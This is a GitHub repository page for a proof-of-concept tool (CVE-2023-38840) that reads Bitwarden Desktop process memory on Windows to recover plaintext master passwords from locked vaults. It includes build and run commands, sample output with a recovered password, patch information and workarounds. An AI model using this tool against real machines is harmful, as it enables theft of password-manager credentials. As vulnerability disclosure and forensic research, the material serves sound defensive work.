
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmarkuta%2Fbw-dump)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmarkuta%2Fbw-dump)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=markuta%2Fbw-dump)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[markuta](/markuta)
/
**[bw-dump](/markuta/bw-dump)**
Public

* [Notifications](/login?return_to=%2Fmarkuta%2Fbw-dump) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2Fmarkuta%2Fbw-dump)
* [Star
   38](/login?return_to=%2Fmarkuta%2Fbw-dump)

A proof-of-concept for (CVE-2023-38840) that extracts plaintext master passwords from a locked Bitwarden vault.

### License

[BSD-3-Clause license](/markuta/bw-dump/blob/main/LICENSE)

[38
stars](/markuta/bw-dump/stargazers) [2
forks](/markuta/bw-dump/forks) [Branches](/markuta/bw-dump/branches) [Tags](/markuta/bw-dump/tags) [Activity](/markuta/bw-dump/activity)
 [Star](/login?return_to=%2Fmarkuta%2Fbw-dump)

 [Notifications](/login?return_to=%2Fmarkuta%2Fbw-dump) You must be signed in to change notification settings

* [Code](/markuta/bw-dump)
* [Issues
  0](/markuta/bw-dump/issues)
* [Pull requests
  0](/markuta/bw-dump/pulls)
* [Actions](/markuta/bw-dump/actions)
* [Projects
  0](/markuta/bw-dump/projects)
* [Security](/markuta/bw-dump/security)
* [Insights](/markuta/bw-dump/pulse)

Additional navigation options

* [Code](/markuta/bw-dump)
* [Issues](/markuta/bw-dump/issues)
* [Pull requests](/markuta/bw-dump/pulls)
* [Actions](/markuta/bw-dump/actions)
* [Projects](/markuta/bw-dump/projects)
* [Security](/markuta/bw-dump/security)
* [Insights](/markuta/bw-dump/pulse)

# markuta/bw-dump

    main[Branches](/markuta/bw-dump/branches)[Tags](/markuta/bw-dump/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[22 Commits](/markuta/bw-dump/commits/main/) | | |
| [.gitignore](/markuta/bw-dump/blob/main/.gitignore ".gitignore") | | [.gitignore](/markuta/bw-dump/blob/main/.gitignore ".gitignore") |  |  |
| [LICENSE](/markuta/bw-dump/blob/main/LICENSE "LICENSE") | | [LICENSE](/markuta/bw-dump/blob/main/LICENSE "LICENSE") |  |  |
| [README.md](/markuta/bw-dump/blob/main/README.md "README.md") | | [README.md](/markuta/bw-dump/blob/main/README.md "README.md") |  |  |
| [constants.go](/markuta/bw-dump/blob/main/constants.go "constants.go") | | [constants.go](/markuta/bw-dump/blob/main/constants.go "constants.go") |  |  |
| [go.mod](/markuta/bw-dump/blob/main/go.mod "go.mod") | | [go.mod](/markuta/bw-dump/blob/main/go.mod "go.mod") |  |  |
| [go.sum](/markuta/bw-dump/blob/main/go.sum "go.sum") | | [go.sum](/markuta/bw-dump/blob/main/go.sum "go.sum") |  |  |
| [lookups.go](/markuta/bw-dump/blob/main/lookups.go "lookups.go") | | [lookups.go](/markuta/bw-dump/blob/main/lookups.go "lookups.go") |  |  |
| [main.go](/markuta/bw-dump/blob/main/main.go "main.go") | | [main.go](/markuta/bw-dump/blob/main/main.go "main.go") |  |  |
| [models.go](/markuta/bw-dump/blob/main/models.go "models.go") | | [models.go](/markuta/bw-dump/blob/main/models.go "models.go") |  |  |
| [utils.go](/markuta/bw-dump/blob/main/utils.go "utils.go") | | [utils.go](/markuta/bw-dump/blob/main/utils.go "utils.go") |  |  |
| View all files | | |

## Repository files navigation

* README
* BSD-3-Clause license
# BW-Dump

**Updated 2**: This vulnerability was assigned `CVE-2023-38840`.

**Updated**: A patch was released on GitHub pull request ([5813](https://github.com/bitwarden/clients/pull/5813)) which fixes the vulnerability. The affected versions are Bitwarden Desktop `2023.7.0` and below.

## Description

A proof-of-concept tool that extracts the master password from a locked Bitwarden vault (must be unlocked at least once) from Windows systems. It only works for the current session, meaning it will not work after a system reboot. Administrative privileges are NOT required.

A blog was published and is available at: <https://redmaple.tech/blogs/2023/extract-bitwarden-vault-passwords/>

### Demo

A short demo of using bw-dump with Microsoft Edge and the Bitwarden browser extension. The latest tool only works on the Bitwarden Desktop.

bw-dump-demo.mov

## Building

> **Warning**: Windows Defender will report the compiled binary as malicious!

To build a stripped binary, type:

```
go build -ldflags="-s -w"

```

To build on a Linux system, type:

```
env GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
```

## Running

Simply build and execute the binary. It does NOT require admin rights. Make sure the Bitwarden process is running. In addition, the vault needs to be unlocked at least once. After which, the master password will be stored in memory for a period of time.

You can also pass the `-d` option to dump memory regions when a pattern is found. For each result, a filename `dump-pid-<PID>-<MEM-REGION>.hex` is created in the current working directory.

**Example Output**

```
PS C:\Users\Tester\dev\go\bw-dump> bw-dump.exe

 888 88b, Y8b Y8b Y888P    888 88e
 888 88P'  Y8b Y8b Y8P     888 888b  8888 8888 888 888 8e  888 88e
 888 8K     Y8b Y8b Y  888 888 8888D 8888 8888 888 888 88b 888 888b
 888 88b,    Y8b Y8b       888 888P  Y888 888P 888 888 888 888 888P
 888 88P'     Y8P Y        888 88"    "88 88"  888 888 888 888 88"
                                                           888
            Created by @NazMarkuta at Red Maple            888

BW-Dump is a Windows forensics tool that extracts Bitwarden master passwords from locked vaults
(must be unlocked at least once) by reading process memory using Windows API functions which
searches for magic byte patterns. The tool doesn't require any special (admin) permissions.

Now supports Bitwarden Desktop App (v2023.1.1) running on Windows 10 or 11. The tool (may)
still support older Bitwarden Chromium extension versions (v2022.6.0) and below.

[+] Searching for processes...
[+] PID: 4228
[+] EXEName: Bitwarden.exe
[+] CMDLine: "C:\Users\Tester\AppData\Local\Programs\Bitwarden\Bitwarden.exe" --type=renderer --user-data-dir="C:\Users\Tester\AppData\Roaming\Bitwarden" --app-path="C:\Users\Tester\AppData\Local\Programs\Bitwarden\resources\app.asar" --no-sandbox --no-zygote --first-renderer-process --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=4 --time-ticks-at-unix-epoch=-1675782335888921 --launch-time-ticks=4007177473 --mojo-platform-channel-handle=2508 --field-trial-handle=1792,i,3673052334935287551,6849534636950916074,131072 --disable-features=SpareRendererForSitePerProcess,WinRetrieveSuggestionsOnlyOnDemand /prefetch:1

[+] Searching PID memory (4228)
[+] Found pattern at MemBaseAddr (0xb0800554000)
[+] Found password prefix bytes at offset (0xc121)
[!] Invalid offset size, skipping...

[+] Found pattern at MemBaseAddr (0xb0800a8c000)
[+] Found password prefix bytes at offset (0x1104)
[!] Invalid offset size, skipping...

[+] Found pattern at MemBaseAddr (0xb08014bc000)
[+] Found password prefix bytes at offset (0x62aa)
[+] Password recovered: "SUPER-SECURE-password8"

PS C:\Users\Tester\dev\go\bw-dump>
```

## Is there a solution or workaround?

There are two ways (probably more) the master password can be trashed from memory:

1. Once locked, enter any random WRONG password. This should replace your password stored in memory.
2. Terminate the `Bitwarden.exe` process which Windows should do some garbage collection.

## What's next?

* Create a Volaility3 plugin that can extract master passwords from saved memory dumps.

## About

A proof-of-concept for (CVE-2023-38840) that extracts plaintext master passwords from a locked Bitwarden vault.

### Topics

[windows](/topics/windows "Topic: windows")
[security](/topics/security "Topic: security")
[password-manager](/topics/password-manager "Topic: password-manager")
[forensics](/topics/forensics "Topic: forensics")
[windowsapi](/topics/windowsapi "Topic: windowsapi")
[redteam](/topics/redteam "Topic: redteam")

### Resources

[Readme](#readme-ov-file)
### License

[BSD-3-Clause license](#BSD-3-Clause-1-ov-file)

[Activity](/markuta/bw-dump/activity)
### Stars

[**38**
stars](/markuta/bw-dump/stargazers)
### Watchers

[**1**
watching](/markuta/bw-dump/watchers)
### Forks

[**2**
forks](/markuta/bw-dump/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fmarkuta%2Fbw-dump&report=markuta+%28user%29)

## [Releases 2](/markuta/bw-dump/releases)

[v1.0.3
Latest

Mar 1, 2024](/markuta/bw-dump/releases/tag/v1.0.3)
[+ 1 release](/markuta/bw-dump/releases)

## [Packages 0](/users/markuta/packages?repo_name=bw-dump)

No packages published

## [Contributors 2](/markuta/bw-dump/graphs/contributors)

## Languages

* [Go
  100.0%](/markuta/bw-dump/search?l=go)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

